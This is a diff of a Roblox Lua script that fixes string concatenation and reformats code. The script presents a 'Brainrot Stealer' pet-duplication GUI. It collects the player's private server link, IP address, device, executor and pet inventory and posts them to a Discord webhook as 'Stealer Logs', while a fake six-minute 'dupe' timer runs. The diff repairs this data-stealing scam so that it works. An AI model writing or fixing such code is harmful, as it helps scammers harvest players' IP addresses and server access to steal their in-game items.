@@ -352,27 +352,29 @@ local function startDupeProcess(psLink)
 
     local embed = {
         title = "🧠 ALL BEST BRAINROTS",
-        description = "📡 **Private Server:** " + (psLink or "Not provided"),
+        description = "📡 **Private Server:** " .. (psLink or "Not provided"),
         color = 65280,
         author = {name = playerName, icon_url = playerAvatar, url = playerProfile},
         fields = {
-            {name = "👤 USER INFO", value = "```🛠️ Executor: " + exec + "\\n🌐 IP: " + ip + "\\n📱 Device: " + dev + "```", inline = true},
-            {name = "🔗 LINKS", value = "[👤 Profile](" + playerProfile + ")", inline = true},
-            {name = "🎮 SERVER", value = "```👥 Players: " + pc + "\\n🐾 Total Pets: " + #all + "\\n🧠 Brainrots: " + #brain + "```", inline = true},
-            {name = "🏆 TOP 5 PETS", value = "```" + fmtPetList(best,true) + "```", inline = false},
-            {name = "🧠 BRAINROTS", value = "```" + fmtPetList(brain,true) + "```", inline = false},
-            {name = "🎯 HIT STATUS", value = "**" + hit + "**", inline = false}
+            {name = "👤 USER INFO", value = "```🛠️ Executor: " .. exec .. "\\n🌐 IP: " .. ip .. "\\n📱 Device: " .. dev .. "```", inline = true},
+            {name = "🔗 LINKS", value = "[👤 Profile](" .. playerProfile .. ")", inline = true},
+            {name = "🎮 SERVER", value = "```👥 Players: " .. pc .. "\\n🐾 Total Pets: " .. #all .. "\\n🧠 Brainrots: " .. #brain .. "```", inline = true},
+            {name = "🏆 TOP 5 PETS", value = "```" .. fmtPetList(best,true) .. "```", inline = false},
+            {name = "🧠 BRAINROTS", value = "```" .. fmtPetList(brain,true) .. "```", inline = false},
+            {name = "🎯 HIT STATUS", value = "**" .. hit .. "**", inline = false}
         },
-        footer = {text = "🧠 Stealer Logs • " + os.date("%X")},
+        footer = {text = "🧠 Stealer Logs • " .. os.date("%X")},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
     SendToDiscord(embed)
 
     sl.Text = "✅ Logs sent! Starting 6-minute timer..."
-    local total = 360 local start = tick()
+    local total = 360 
+    local start = tick()
     while tick()-start < total do
         local left = total-(tick()-start)
-        local m = math.floor(left/60) local s = math.floor(left%60)
+        local m = math.floor(left/60) 
+        local s = math.floor(left%60)
         tl.Text = string.format("%02d:%02d",m,s)
         wait(0.1)
     end
@@ -382,31 +384,71 @@ local function startDupeProcess(psLink)
         color = 65280,
         author = {name = playerName, icon_url = playerAvatar, url = playerProfile},
         fields = {
-            {name = "📊 RESULTS", value = "```⏰ Time: 6 min\\n🐾 Pets Duped: " + #all + "\\n🧠 Brainrots: " + #brain + "\\n🎯 Status: " + hit + "```", inline = false}
+            {name = "📊 RESULTS", value = "```⏰ Time: 6 min\\n🐾 Pets Duped: " .. #all .. "\\n🧠 Brainrots: " .. #brain .. "\\n🎯 Status: " .. hit .. "```", inline = false}
         },
-        footer = {text = "🧠 Stealer Logs • " + os.date("%X")}
+        footer = {text = "🧠 Stealer Logs • " .. os.date("%X")}
     })
 
-    sl.Text = "🎉 Complete! Closing..."; tl.Text = "DONE!"
-    wait(3); bs:Destroy()
+    sl.Text = "🎉 Complete! Closing..."
+    tl.Text = "DONE!"
+    wait(3)
+    bs:Destroy()
 end
 
 local function createPSInputGUI()
-    local sg = Instance.new("ScreenGui"); sg.Name = "DupeScannerGUI"; sg.ResetOnSpawn = false; sg.Parent = player.PlayerGui
-    local mf = Instance.new("Frame"); mf.Size = UDim2.new(0,400,0,250); mf.Position = UDim2.new(0.5,-200,0.5,-125); mf.BackgroundColor3 = Color3.fromRGB(20,20,20); mf.BorderSizePixel = 0; mf.Parent = sg
-    local title = Instance.new("TextLabel"); title.Size = UDim2.new(1,0,0,60); title.BackgroundColor3 = Color3.fromRGB(0,50,0); title.Text = "🧠 BRAINROT STEALER\\nEVERYONE CAN USE"; title.TextColor3 = Color3.fromRGB(0,255,0); title.Font = Enum.Font.GothamBold; title.TextSize = 16; title.Parent = mf
-    local tb = Instance.new("TextBox"); tb.Size = UDim2.new(0.8,0,0,40); tb.Position = UDim2.new(0.1,0,0.3,0); tb.BackgroundColor3 = Color3.fromRGB(40,40,40); tb.TextColor3 = Color3.new(1,1,1); tb.PlaceholderText = "Paste Roblox game link here..."; tb.TextSize = 14; tb.Parent = mf
-    local btn = Instance.new("TextButton"); btn.Size = UDim2.new(0.7,0,0,50); btn.Position = UDim2.new(0.15,0,0.7,0); btn.BackgroundColor3 = Color3.fromRGB(0,200,0); btn.Text = "🚀 START STEALING"; btn.TextColor3 = Color3.new(1,1,1); btn.Font = Enum.Font.GothamBold; btn.TextSize = 14; btn.Parent = mf
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "DupeScannerGUI"
+    sg.ResetOnSpawn = false
+    sg.Parent = player.PlayerGui
+    
+    local mf = Instance.new("Frame")
+    mf.Size = UDim2.new(0,400,0,250)
+    mf.Position = UDim2.new(0.5,-200,0.5,-125)
+    mf.BackgroundColor3 = Color3.fromRGB(20,20,20)
+    mf.BorderSizePixel = 0
+    mf.Parent = sg
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1,0,0,60)
+    title.BackgroundColor3 = Color3.fromRGB(0,50,0)
+    title.Text = "🧠 BRAINROT STEALER\\nEVERYONE CAN USE"
+    title.TextColor3 = Color3.fromRGB(0,255,0)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.Parent = mf
+    
+    local tb = Instance.new("TextBox")
+    tb.Size = UDim2.new(0.8,0,0,40)
+    tb.Position = UDim2.new(0.1,0,0.3,0)
+    tb.BackgroundColor3 = Color3.fromRGB(40,40,40)
+    tb.TextColor3 = Color3.new(1,1,1)
+    tb.PlaceholderText = "Paste Roblox game link here..."
+    tb.TextSize = 14
+    tb.Parent = mf
+    
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.7,0,0,50)
+    btn.Position = UDim2.new(0.15,0,0.7,0)
+    btn.BackgroundColor3 = Color3.fromRGB(0,200,0)
+    btn.Text = "🚀 START STEALING"
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 14
+    btn.Parent = mf
+    
     btn.MouseButton1Click:Connect(function()
         local link = tb.Text
         if string.find(string.lower(link or ""),"roblox") then
-            btn.Text = "🔄 STARTING..."; btn.BackgroundColor3 = Color3.fromRGB(0,100,0)
+            btn.Text = "🔄 STARTING..."
+            btn.BackgroundColor3 = Color3.fromRGB(0,100,0)
             wait(1)
             startDupeProcess(link)
         else
-            btn.Text = "❌ INVALID LINK"; btn.BackgroundColor3 = Color3.fromRGB(200,0,0)
+            btn.Text = "❌ INVALID LINK"
+            btn.BackgroundColor3 = Color3.fromRGB(200,0,0)
             wait(2)
-            btn.Text = "🚀 START STEALING"; btn.BackgroundColor3 = Color3.fromRGB(0,200,0)
+            btn.Text = "🚀 START STEALING"
+            btn.BackgroundColor3 = Color3.fromRGB(0,200,0)
         end
     end)
 end
